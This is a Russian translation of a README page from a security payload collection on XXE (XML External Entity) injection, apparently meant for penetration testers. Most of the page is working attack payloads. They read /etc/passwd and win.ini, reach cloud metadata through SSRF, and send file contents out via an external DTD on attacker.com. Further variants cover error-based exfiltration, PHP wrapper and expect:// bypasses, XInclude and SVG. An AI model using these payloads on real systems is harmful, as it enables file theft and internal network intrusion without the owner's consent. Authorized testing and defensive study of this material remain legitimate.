<a id="-xxe---xml-external-entity-injection"></a>
# 📄 XXE — внедрение внешних сущностей XML

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML External Entity Injection
```

---

<a id="-what-is-xxe"></a>
## 🎯 Что такое XXE

> **Уточнение к оригиналу.** Успех примеров зависит от парсера, разрешённых внешних ресурсов и настроек приложения. Наличие XML или SVG само по себе не доказывает XXE. Надпись в ASCII-логотипе означает «внедрение внешних сущностей XML».


**XXE** использует обработку ссылок на внешние сущности XML-парсером, что позволяет читать файлы, выполнять запросы от имени сервера (SSRF), а в некоторых случаях — выполнять код (RCE).

---

<a id="-basic-payloads"></a>
## 💉 Базовые полезные нагрузки

<a id="read-local-files"></a>
### Чтение локальных файлов
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

<a id="windows-files"></a>
### Файлы Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

<a id="ssrf-via-xxe"></a>
### SSRF через XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

<a id="-blind-xxe-out-of-band"></a>
## 🔒 Слепая XXE через внешний канал (Out-of-Band)

<a id="external-dtd"></a>
### Внешняя DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**Файл evil.dtd на сервере атакующего:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

<a id="error-based-exfiltration"></a>
### Извлечение данных через сообщения об ошибках

> **Уточнение.** По [XML 1.0](https://www.w3.org/TR/xml/#sec-prolog-dtd), ссылки на параметрические сущности внутри объявлений внутренней DTD ограничены: приведённый ниже фрагмент может быть отклонён. Имя в DOCTYPE также должно совпадать с корневым элементом для проверки валидности. Исходные примеры сохранены.

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Способы обхода ограничений

<a id="encoding"></a>
### Кодирование

> **Уточнение.** Согласно [грамматике пролога XML](https://www.w3.org/TR/xml/#sec-prolog-dtd), комментарий не может предшествовать декларации XML. Объявление UTF-16 должно соответствовать фактической кодировке данных. Здесь приведены фрагменты оригинала; Base64 через PHP-обёртку не является универсальным обходом.

```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Обёртка с Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

<a id="protocol-variants"></a>
### Варианты протоколов

> **Уточнение.** PHP-обёртки зависят от среды выполнения; [expect:// требует расширения Expect](https://www.php.net/manual/en/wrappers.expect.php), которое не включено по умолчанию.

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

<a id="xinclude"></a>
### XInclude

> **Уточнение.** [XInclude обрабатывается отдельно от внешних сущностей](https://www.w3.org/TR/xinclude/#rel-ent): результат зависит от поддержки и включения этой обработки приложением.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

<a id="svg-xxe"></a>
### XXE в SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

| Тип полезной нагрузки | Применение |
|--------------|----------|
| Чтение файла | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Слепая XXE (OOB) | Внешняя DTD и передача данных |
| Через сообщения об ошибках | Вызов ошибки, содержащей данные |

<a id="common-vulnerable-endpoints"></a>
### Типичные точки обработки с возможной уязвимостью
```
- API SOAP
- Загрузка файлов XML
- Обработчики SVG
- Парсеры документов (DOCX, XLSX)
- Ленты RSS/Atom
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [XXE в материалах PortSwigger](https://portswigger.net/web-security/xxe)
- [XXE в PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Исследуйте уязвимости XML-парсеров!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
